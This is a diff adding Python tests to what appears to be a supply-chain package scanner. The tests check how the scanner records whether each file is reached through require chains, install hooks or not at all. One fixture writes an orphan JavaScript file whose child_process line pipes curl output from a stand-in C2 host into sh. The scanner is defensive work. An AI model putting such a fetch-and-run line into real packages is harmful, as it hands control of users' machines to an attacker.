@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import json
+from pathlib import Path
 
 from cordon_scanner import Scanner
 from cordon_scanner.engine.registry import Registry
@@ -305,3 +306,71 @@ class TestHostileNamesNeverReachTheRecord:
             "xxxx",
         ):
             assert leak not in dumped, leak
+
+
+class TestEachFileCarriesHowItIsReached:
+    """`facts_version` 2: `reach` and `reach_depth` per file (`decide/reach.py`), from a closed list, and the counts by kind under `package.reach`."""
+
+    def test_the_record_carries_the_reach_of_a_file_and_no_name(self) -> None:
+        reach = {
+            "lib/helper-spawn.js": ("unreached", 0),
+            "dist/index.js": ("placed", 0),
+            "install.js": ("hook_command", 0),
+        }
+        record = ScanFacts.of(FactsKit.result(reach=reach))
+        by_key = {f["key"]: f for f in record["files"]}
+        assert by_key[ScanFacts.file_key("lib/helper-spawn.js")]["reach"] == "unreached"
+        assert by_key[ScanFacts.file_key("dist/index.js")]["reach"] == "placed"
+        assert record["package"]["reach"] == {"hook_command": 1, "placed": 1, "unreached": 1}
+        for text in PACKAGE_TEXT:
+            assert text not in json.dumps(record)
+
+    def test_a_file_of_another_kind_is_not_code(self) -> None:
+        record = ScanFacts.of(FactsKit.result())
+        assert {f["reach"] for f in record["files"]} == {"not_code"}
+        assert {f["reach_depth"] for f in record["files"]} == {0}
+
+    def test_a_reach_outside_the_closed_list_is_other_and_the_depth_is_bounded(self) -> None:
+        record = ScanFacts.of(
+            FactsKit.result(reach={"lib/helper-spawn.js": ("a-name-the-package-chose", 99)})
+        )
+        entry = next(
+            f for f in record["files"] if f["key"] == ScanFacts.file_key("lib/helper-spawn.js")
+        )
+        assert entry["reach"] == "OTHER"
+        assert entry["reach_depth"] <= 4
+        assert "a-name-the-package-chose" not in json.dumps(record)
+
+    def test_the_version_is_two(self) -> None:
+        assert FACTS_VERSION == "2"
+
+    def test_a_real_scan_classes_a_chain_and_an_orphan(self, tmp_path: Path) -> None:
+        (tmp_path / "package.json").write_text(
+            json.dumps(
+                {
+                    "name": "p",
+                    "version": "1.0.0",
+                    "main": "index.js",
+                    "scripts": {"postinstall": "node setup.js"},
+                }
+            ),
+            encoding="utf-8",
+        )
+        (tmp_path / "index.js").write_text(
+            'const a = require("./lib/a");\nmodule.exports = a;\n', encoding="utf-8"
+        )
+        (tmp_path / "setup.js").write_text('console.log("ready");\n', encoding="utf-8")
+        (tmp_path / "lib").mkdir()
+        (tmp_path / "lib" / "a.js").write_text("module.exports = 1;\n", encoding="utf-8")
+        (tmp_path / "lib" / "orphan.js").write_text(
+            'const cp = require("child_process");\ncp.exec("curl -s https://c2.invalid/x | sh");\n',
+            encoding="utf-8",
+        )
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        assert result.reach is not None
+        assert result.reach["setup.js"][0] in ("hook_command", "placed")
+        assert result.reach["lib/a.js"] == ("require_chain", 1)
+        assert result.reach["lib/orphan.js"] == ("unreached", 0)
+        record = ScanFacts.of(result)
+        orphan = next(f for f in record["files"] if f["key"] == ScanFacts.file_key("lib/orphan.js"))
+        assert orphan["reach"] == "unreached" and orphan["reach_depth"] == 0
